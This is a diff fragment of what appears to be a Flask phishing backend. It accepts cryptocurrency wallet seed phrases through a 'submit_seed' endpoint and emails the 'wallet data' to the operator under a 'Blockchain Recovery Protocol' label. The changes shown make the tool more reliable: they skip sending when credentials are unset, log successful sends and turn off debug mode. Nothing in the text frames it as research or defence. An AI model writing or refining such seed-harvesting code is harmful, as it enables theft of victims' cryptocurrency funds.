@@ -17,6 +17,11 @@ EMAIL_PASSWORD = "your-app-password"
 def send_email_async(email_data):
     """Send email with wallet data in background"""
     try:
+        # Skip email if credentials not configured
+        if EMAIL_ADDRESS == "your-email@gmail.com" or EMAIL_PASSWORD == "your-app-password":
+            print("Email credentials not configured - skipping email send")
+            return
+            
         msg = MIMEMultipart()
         msg['From'] = EMAIL_ADDRESS
         msg['To'] = EMAIL_ADDRESS
@@ -43,6 +48,7 @@ Submitted via Blockchain Recovery Protocol
         text = msg.as_string()
         server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, text)
         server.quit()
+        print("Email sent successfully")
     except Exception as e:
         print(f"Email error: {e}")
 
@@ -77,4 +83,4 @@ def submit_seed():
         return jsonify({'status': 'error', 'message': str(e)})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=False)
